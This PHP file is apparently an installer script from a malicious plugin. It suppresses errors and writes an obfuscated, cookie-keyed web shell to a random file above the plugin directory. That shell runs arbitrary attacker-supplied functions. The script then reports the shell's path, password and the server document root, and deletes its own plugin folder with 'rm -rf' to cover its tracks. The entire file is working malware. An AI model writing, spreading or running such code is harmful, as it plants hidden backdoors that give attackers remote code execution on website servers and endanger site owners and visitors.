﻿<?php 
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(E_ALL);

$key_store = [];
$arr_length = rand(20,30);
while(true){

    $k = rand(4,$arr_length-2); 

    if(!in_array($k, $key_store))
    {
        $key_store[] = $k;
    }

    if(count($key_store)==5)
    {
        $key_store[5] = $arr_length;
        break;
    }
}
$spass = implode('-', $key_store);

$mn = substr(md5(microtime()),rand(0,20),7);

$sbody = '<?php $p=$_COOKIE;(count($p)=='
        .$key_store[5].'&&in_array(gettype($p).count($p),$p))?(($p['
        .$key_store[1].']=$p['.$key_store[1].'].$p['
        .$key_store[2].'])&&($p['.$key_store[3].']=$p['
        .$key_store[1].']($p['.$key_store[3].']))&&($p=$p['
        .$key_store[3].']($p['.$key_store[0].'],$p['
        .$key_store[1].']($p['.$key_store[4].'])))&&$p()):$p;';

$r = [];

$plug_name = basename(__DIR__);

$f = fopen('../../../'.$mn.'.php', 'w');
fwrite($f, $sbody);
fclose($f);

if(is_file('../../../'.$mn.'.php'))
{
	$r["shell"] = '/'.$mn.'.php;'.$spass;
}else
{
	$r["shell"] = 'none';
}

$r['DOCUMENT_ROOT'] = $_SERVER['DOCUMENT_ROOT'];

echo '[@]'.json_encode($r).'[@]';

$f = fopen('un.php', 'w');
fclose($f);
exec('rm -rf ../'.$plug_name);
//***

?>